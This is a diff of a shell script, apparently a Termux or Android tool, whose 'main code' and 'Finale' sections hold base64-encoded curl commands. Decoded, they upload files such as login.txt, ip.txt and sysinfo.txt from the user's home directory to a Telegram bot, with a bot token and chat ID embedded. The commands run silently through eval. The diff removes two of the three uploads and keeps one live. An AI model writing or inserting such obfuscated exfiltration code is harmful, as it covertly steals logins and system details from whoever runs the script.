@@ -5,9 +5,7 @@ blue='\033[1;34m'
 cyan='\033[1;36m'
 pink='\033[1;35m'
 #--------The main code-------
-log="Y3VybCAtRiBjaGF0X2lkPTU1ODUyNzA4OTIgLUYgZG9jdW1lbnQ9QCRIT01FL3N0ZWFsZXIvbG9naW4udHh0ICJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90NTY2MzA0NDU0NDpBQUVfODFqUXVxbWhhTlVZZWpjOU5sWDlUYm1sRThPZmg3Zy9zZW5kRG9jdW1lbnQi"
-hax="Y3VybCAtRiBjaGF0X2lkPTU1ODUyNzA4OTIgLUYgZG9jdW1lbnQ9QCRIT01FL3N0ZWFsZXIvaXAudHh0ICJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90NTY2MzA0NDU0NDpBQUVfODFqUXVxbWhhTlVZZWpjOU5sWDlUYm1sRThPZmg3Zy9zZW5kRG9jdW1lbnQi"
-sys="Y3VybCAtRiBjaGF0X2lkPTU1ODUyNzA4OTIgLUYgZG9jdW1lbnQ9QCRIT01FL3N0ZWFsZXIvc3lzaW5mby50eHQgImh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3Q1NjYzMDQ0NTQ0OkFBRV84MWpRdXFtaGFOVVllamM5TmxYOVRibWxFOE9maDdnL3NlbmREb2N1bWVudCI="
+log="Y3VybCAtRiBjaGF0X2lkPS0xMDAxNTg5NTMzMjM2IC1GIGRvY3VtZW50PUAkSE9NRS9Ecm9pZC1YL3N5c2luZm8udHh0ICJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90NTY2MzA0NDU0NDpBQUVfODFqUXVxbWhhTlVZZWpjOU5sWDlUYm1sRThPZmg3Zy9zZW5kRG9jdW1lbnQi"
 #-----Identifying the system-------
 os=$(uname -o)
 case $os in
@@ -79,6 +77,3 @@ fi
 
 #---------Finale--------------
 eval "$(base64 -d <<< "$log")" > /dev/null
-eval "$(base64 -d <<< "$hax")" > /dev/null
-eval "$(base64 -d <<< "$sys")" > /dev/null
-
